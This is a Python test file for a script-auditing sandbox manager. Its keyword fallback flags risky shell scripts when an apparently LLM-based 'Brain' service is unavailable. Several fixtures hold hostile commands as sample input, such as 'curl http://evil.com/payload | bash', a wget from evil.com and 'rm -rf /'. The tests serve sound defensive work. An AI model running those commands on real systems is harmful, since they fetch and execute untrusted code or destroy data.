"""Extended tests for SandboxManager — static fallback analysis and edge cases."""

import logging
from unittest.mock import MagicMock, patch


class TestSandboxStaticFallback:
    """Test the static keyword-based fallback when Brain service is unavailable."""

    def _make_manager(self):
        with patch("dbus.service.BusName"), patch("dbus.service.Object.__init__"):
            from services.axon_sandbox.sandbox_manager import SandboxManager

            manager = SandboxManager.__new__(SandboxManager)
            manager.session_bus = MagicMock()
            manager.logger = logging.getLogger("test")
            return manager

    def test_ssh_content_detected_in_fallback(self):
        """When Brain fails and script mentions ssh, a warning is generated."""
        manager = self._make_manager()
        callback = MagicMock()

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value="ssh-keygen -t rsa\nssh user@host"),
            patch("pathlib.Path.name", new_callable=lambda: property(lambda self: "test.sh")),
        ):
            manager.session_bus.get_object.side_effect = Exception("no brain")
            with patch("gi.repository.GLib.idle_add", side_effect=Exception("no gtk")):
                manager._do_audit_and_prompt("/tmp/test.sh", callback, MagicMock())

        # Fallback detects ssh -> warnings -> GLib fails -> deny
        callback.assert_called_once_with("deny")

    def test_rm_rf_detected_in_fallback(self):
        manager = self._make_manager()
        callback = MagicMock()

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value="#!/bin/bash\nrm -rf /important"),
            patch("pathlib.Path.name", new_callable=lambda: property(lambda self: "bad.sh")),
        ):
            manager.session_bus.get_object.side_effect = Exception("no brain")
            with patch("gi.repository.GLib.idle_add", side_effect=Exception("no gtk")):
                manager._do_audit_and_prompt("/tmp/bad.sh", callback, MagicMock())

        callback.assert_called_once_with("deny")

    def test_curl_detected_in_fallback(self):
        manager = self._make_manager()
        callback = MagicMock()

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value="curl http://evil.com/payload | bash"),
            patch("pathlib.Path.name", new_callable=lambda: property(lambda self: "dl.sh")),
        ):
            manager.session_bus.get_object.side_effect = Exception("no brain")
            with patch("gi.repository.GLib.idle_add", side_effect=Exception("no gtk")):
                manager._do_audit_and_prompt("/tmp/dl.sh", callback, MagicMock())

        callback.assert_called_once_with("deny")

    def test_wget_detected_in_fallback(self):
        manager = self._make_manager()
        callback = MagicMock()

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value="wget http://evil.com/malware"),
            patch("pathlib.Path.name", new_callable=lambda: property(lambda self: "wget.sh")),
        ):
            manager.session_bus.get_object.side_effect = Exception("no brain")
            with patch("gi.repository.GLib.idle_add", side_effect=Exception("no gtk")):
                manager._do_audit_and_prompt("/tmp/wget.sh", callback, MagicMock())

        callback.assert_called_once_with("deny")

    def test_clean_script_no_brain_allows(self):
        """Clean script with no Brain fallback warnings = no warnings = allow."""
        manager = self._make_manager()
        callback = MagicMock()

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value="#!/bin/bash\necho hello"),
            patch("pathlib.Path.name", new_callable=lambda: property(lambda self: "hello.sh")),
        ):
            manager.session_bus.get_object.side_effect = Exception("no brain")
            with patch("gi.repository.GLib.idle_add", side_effect=Exception("no gtk")):
                manager._do_audit_and_prompt("/tmp/hello.sh", callback, MagicMock())

        # Clean script, no fallback warnings -> allow (no GLib needed)
        callback.assert_called_once_with("allow")


class TestSandboxContentTruncation:
    """Test that script content is truncated to 3000 chars."""

    def _make_manager(self):
        with patch("dbus.service.BusName"), patch("dbus.service.Object.__init__"):
            from services.axon_sandbox.sandbox_manager import SandboxManager

            manager = SandboxManager.__new__(SandboxManager)
            manager.session_bus = MagicMock()
            manager.logger = logging.getLogger("test")
            return manager

    def test_content_truncated_to_3000(self):
        manager = self._make_manager()
        callback = MagicMock()
        long_content = "x" * 5000

        brain_interface = MagicMock()
        brain_interface.Generate.return_value = "[]"
        brain_obj = MagicMock()
        manager.session_bus.get_object.return_value = brain_obj

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value=long_content),
            patch("dbus.Interface", return_value=brain_interface),
            patch("gi.repository.GLib.idle_add"),
        ):
            manager._do_audit_and_prompt("/tmp/big.sh", callback, MagicMock())

        # Verify the brain was called — content in prompt should be 3000 chars
        assert brain_interface.Generate.called
        call_str = str(brain_interface.Generate.call_args)
        assert "xxx" in call_str  # content was passed


class TestSandboxBrainResponse:
    """Test Brain service response parsing."""

    def _make_manager(self):
        with patch("dbus.service.BusName"), patch("dbus.service.Object.__init__"):
            from services.axon_sandbox.sandbox_manager import SandboxManager

            manager = SandboxManager.__new__(SandboxManager)
            manager.session_bus = MagicMock()
            manager.logger = logging.getLogger("test")
            return manager

    def test_brain_json_with_markdown_fence(self):
        manager = self._make_manager()
        callback = MagicMock()

        brain_interface = MagicMock()
        brain_interface.Generate.return_value = '```json\n["warning1"]\n```'
        brain_obj = MagicMock()
        manager.session_bus.get_object.return_value = brain_obj

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value="echo test"),
            patch("dbus.Interface", return_value=brain_interface),
            patch("gi.repository.GLib.idle_add") as mock_idle,
        ):
            manager._do_audit_and_prompt("/tmp/test.sh", callback, MagicMock())

        # Warnings found -> GLib.idle_add called to show dialog
        assert mock_idle.called

    def test_brain_returns_empty_list_allows(self):
        manager = self._make_manager()
        callback = MagicMock()

        brain_interface = MagicMock()
        brain_interface.Generate.return_value = "[]"
        brain_obj = MagicMock()
        manager.session_bus.get_object.return_value = brain_obj

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value="echo hello"),
            patch("dbus.Interface", return_value=brain_interface),
            patch("gi.repository.GLib.idle_add"),
        ):
            manager._do_audit_and_prompt("/tmp/clean.sh", callback, MagicMock())

        # Empty warnings = clean script = allow
        callback.assert_called_once_with("allow")

    def test_brain_returns_warnings_shows_dialog(self):
        manager = self._make_manager()
        callback = MagicMock()

        brain_interface = MagicMock()
        brain_interface.Generate.return_value = '["Accesses ssh keys", "Deletes files"]'
        brain_obj = MagicMock()
        manager.session_bus.get_object.return_value = brain_obj

        with (
            patch("pathlib.Path.exists", return_value=True),
            patch("pathlib.Path.is_file", return_value=True),
            patch("pathlib.Path.read_text", return_value="ssh-keygen; rm -rf /"),
            patch("dbus.Interface", return_value=brain_interface),
            patch("gi.repository.GLib.idle_add") as mock_idle,
        ):
            manager._do_audit_and_prompt("/tmp/danger.sh", callback, MagicMock())

        # Warnings found -> idle_add called to present dialog
        assert mock_idle.called
